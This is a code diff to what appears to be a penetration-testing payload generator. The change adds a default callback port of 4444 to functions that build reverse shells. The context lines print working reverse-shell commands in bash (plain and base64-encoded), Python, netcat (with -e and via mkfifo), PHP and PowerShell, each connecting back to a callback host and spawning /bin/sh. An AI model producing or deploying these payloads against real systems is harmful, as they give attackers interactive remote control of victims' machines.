@@ -23,7 +23,7 @@ def _write_shell(content, shell_type, ext="sh"):
     return f"shells/{filename}"
 
 
-def bash_shell(callback_host, callback_port):
+def bash_shell(callback_host, callback_port=4444):
     """Generate a basic bash reverse shell.
 
     Creates: payloads/shells/rev_bash.sh
@@ -36,7 +36,7 @@ bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1
     return _write_shell(content, "bash", "sh")
 
 
-def bash_encoded_shell(callback_host, callback_port):
+def bash_encoded_shell(callback_host, callback_port=4444):
     """Generate a base64-encoded bash reverse shell.
 
     Creates: payloads/shells/rev_bash_b64.sh
@@ -52,7 +52,7 @@ echo "{encoded}" | base64 -d | bash
     return _write_shell(content, "bash_b64", "sh")
 
 
-def python_shell(callback_host, callback_port):
+def python_shell(callback_host, callback_port=4444):
     """Generate a Python reverse shell.
 
     Creates: payloads/shells/rev_python.py
@@ -71,7 +71,7 @@ subprocess.call(["/bin/sh","-i"])
     return _write_shell(content, "python", "py")
 
 
-def python_oneliner(callback_host, callback_port):
+def python_oneliner(callback_host, callback_port=4444):
     """Return a Python reverse shell one-liner (not written to file).
 
     Creates: Nothing (returns command string only)
@@ -80,7 +80,7 @@ def python_oneliner(callback_host, callback_port):
     return f"""python -c 'import socket,os,pty;s=socket.socket();s.connect(("{callback_host}",{callback_port}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/sh")'"""
 
 
-def nc_shell(callback_host, callback_port):
+def nc_shell(callback_host, callback_port=4444):
     """Generate a netcat reverse shell.
 
     Creates: payloads/shells/rev_nc.sh
@@ -93,7 +93,7 @@ nc -e /bin/sh {callback_host} {callback_port}
     return _write_shell(content, "nc", "sh")
 
 
-def nc_mkfifo_shell(callback_host, callback_port):
+def nc_mkfifo_shell(callback_host, callback_port=4444):
     """Generate a netcat reverse shell using mkfifo (for nc without -e).
 
     Creates: payloads/shells/rev_nc_mkfifo.sh
@@ -106,7 +106,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {callback_host} {callback_
     return _write_shell(content, "nc_mkfifo", "sh")
 
 
-def php_shell(callback_host, callback_port):
+def php_shell(callback_host, callback_port=4444):
     """Generate a PHP reverse shell.
 
     Creates: payloads/shells/rev_php.php
@@ -120,7 +120,7 @@ $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
     return _write_shell(content, "php", "php")
 
 
-def powershell_shell(callback_host, callback_port):
+def powershell_shell(callback_host, callback_port=4444):
     """Generate a PowerShell reverse shell.
 
     Creates: payloads/shells/rev_powershell.ps1
@@ -143,7 +143,7 @@ $client.Close()""".replace('<<<', '{').replace('>>>', '}')
     return _write_shell(content, "powershell", "ps1")
 
 
-def powershell_oneliner(callback_host, callback_port):
+def powershell_oneliner(callback_host, callback_port=4444):
     """Return a PowerShell reverse shell one-liner (not written to file).
 
     Creates: Nothing (returns command string only)
